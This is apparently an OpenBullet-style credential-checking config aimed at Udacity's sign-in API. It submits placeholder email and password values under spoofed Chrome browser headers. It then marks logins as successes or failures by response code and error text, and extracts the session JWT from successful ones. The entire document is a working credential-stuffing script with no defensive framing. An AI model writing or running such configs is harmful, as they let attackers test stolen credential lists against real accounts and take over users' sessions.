[SCRIPT]
REQUEST POST "https://auth.udacity.com/api/user/signin" 
  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"otp\":\"\",\"next\":\"https://classroom.udacity.com\"}" 
  CONTENTTYPE "application/json" 
  HEADER ": scheme: https" 
  HEADER "accept: application/json" 
  HEADER "accept-encoding: gzip, deflate, br" 
  HEADER "accept-language: en-US,en;q=0.9" 
  HEADER "content-length: 104" 
  HEADER "content-type: application/json" 
  HEADER "origin: https://auth.udacity.com" 
  HEADER "referer: https://auth.udacity.com/sign-in?next=https://classroom.udacity.com" 
  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
  HEADER "sec-ch-ua-mobile: ?0" 
  HEADER "sec-ch-ua-platform: \"Windows\"" 
  HEADER "sec-fetch-dest: empty" 
  HEADER "sec-fetch-mode: cors" 
  HEADER "sec-fetch-site: same-origin" 
  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
  HEADER "x-udacity-ads-are-blocked: unknown" 

KEYCHECK 
  KEYCHAIN Success OR 
    KEY "<RESPONSECODE>" Contains "200" 
    KEY "<COOKIES{*}>" Contains "_jwt" 
    KEY "{\"jwt\":\"" 
  KEYCHAIN Failure OR 
    KEY "<RESPONSECODE>" Contains "401" 
    KEY "Invalid login credentials" 

#jwt PARSE "<SOURCE>" JSON "jwt" -> VAR "jwt" 

